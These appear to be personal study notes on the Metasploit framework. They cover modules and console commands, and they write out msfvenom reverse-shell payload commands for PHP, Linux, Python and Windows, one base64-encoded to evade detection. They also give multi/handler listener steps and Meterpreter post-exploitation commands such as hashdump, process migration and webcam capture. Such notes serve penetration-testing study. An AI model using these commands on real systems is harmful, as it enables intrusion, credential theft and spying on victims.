#-----OVERVIEW
Exploitation Framework. Allows for easy exploit searching, packaging and execution of exploits and payloads


#-----MODULES
Categorization of tools within the M.S. toolbelt
1) Auxillery - Supporting modules that are not exploit-related. e.g. Scanners, Web Crawlers
2) Encoders - Allows you to encode an exploid or payload to avoid sig. detection. Simple obfuscation
3) Evasion - Modules that attempt to directly evade AV
4) Exploits - Organized exploits per system e.g. Android, Windows, Unix etc.
5) Payloads - The binary that will actually be responsible for performing the naughty action e.g. create rev shell, or run calc.exe as a proof of concept.
- Singles: Self-contained payloads. Do not need anything additional for them to run
- Stagers: Payloads that setup a communication channel b/t M.S. and the victim. Basically a very small payload that sets the stage for larger payloads later
- These can be distinguished via a "_" character in the name. shell_reverse_tcp = Single Payload, whereas, shell/reverse_tcp = Stager 
6) Post - Post-exploit Modules


#-----BASIC CMDS and USAGE
help
history
use <exploit>
search <keyword>
searchsploit <keyword> -> Search exploitdb
search type:exploit <keyword>
search platform:windows <keyword>
show options
show payloads 
show targets
info -> Shows verbose info related to w/e context we've currently selected i.e. we select an exploit, and we can show info regarding that exploit
run 
set <parameter> <value>
unset <parameter>
unset all
check -> Can do a prelim. check to see if the target is vuln before running
background -> Sends current session to b/g
sessions -> View all sessions
sessions -i # -> Foreground chosen session


#-----Enumeration & Scanners
Within auxiliary module, there are a number of scanner and enumerators e.g.
/scanner/discovery/udp_sweep
/scanner/smb/smb_version
/scanner/smb/smb_enumshares
/smb/scanner/smb/smb.login

Other tools are probably better, but these exist if needed.


#-----METASPLOIT DATABASE
The Postgre SQL db simplifies the process of targetting multiple systems in M.S., and allows you to isolate each system as their own separate workspaces.
workspace -a <name> -> add a new workspace
workspace -d <name> -> Delete existing workspace
workspace <name> -> Move to a workspace
workspace -h -> help

DB's can be manually added to. Check hosts -h and services -h commands. Also "help" > "db backend command" to see more options

#-----MSFVENOM & MULTIHANDLERS
Allows for the creation of payloads in different formats (dll, php, exe etc.) for different platforms (unix, windows etc.). For ex. we can create an Meterpreter payload as an exe.

msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -e php/base64 -> Create php payload, set the LHOST para for reverse_tcp & encode it w/ base64. Then the idea would be to delivery this payload somehow and get the user the activate

With a payload created, delivered, and about to be executed, we need to catch the returned shell. This is normally done via the Exploit modules, but if we're making a stand-alone payload w/ venom, we need to catch the returned shell. This can be done w/ multihandlers. For example:
1) Create payload: msfvenom -p php/reverse.php LHOST=<IP> LPORT=<PORT> -f raw > file.php
2) If you cat the file.php, you'll see the raw php code
3) use exploit/multi/handler
4) set payload <payload we created i.e. php/reverse_php>
5) set lhost <IP> set lport <port> -> listening ports
6) run
7) Perform post-exploit 

Additional payloads:
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf > rev_shell.elf  -> Linux exe. (remember +x perm.)
msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > revshell.py
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > rev_shell.exe

#-----METERPRETER
Basically specialized cmd & cntrl system that we can interact w/ w/ specialized cmds. It runs entirely in memory. Nothing is written to disk to avoid AV scanning. 
Commmon commands are:

help -> Will show options specific to your meterpreter session
getuid -> Shows the user w/ which the meterpreter session is running under. May give you an idea regarding privledge lvl
ps -> running processes. Helps for MIGRATION
migrate <PID> -> Migrate to another process. May also allow for additional cmds depending on the process we migrate to. spoolsvc.exe or explorer are nice. Tpyically want x64 w/ SYSTEM
hashdump -> dump ntlm hashes (local, not domain)
search -> Search for a file on the target system
shell -> Opens  a shell on the taget i.e. pwrshell, bash, cmd
load <module> -> This can load additional tools into meterpreter
getpid -> Gets current PID meterpreter is attached to. Migrate to a process w/ SYSTEM
upload
download
screenshot
webcam_snap
pwd
cat
rm
pkill
shutdown
sysinfo
cd
ls
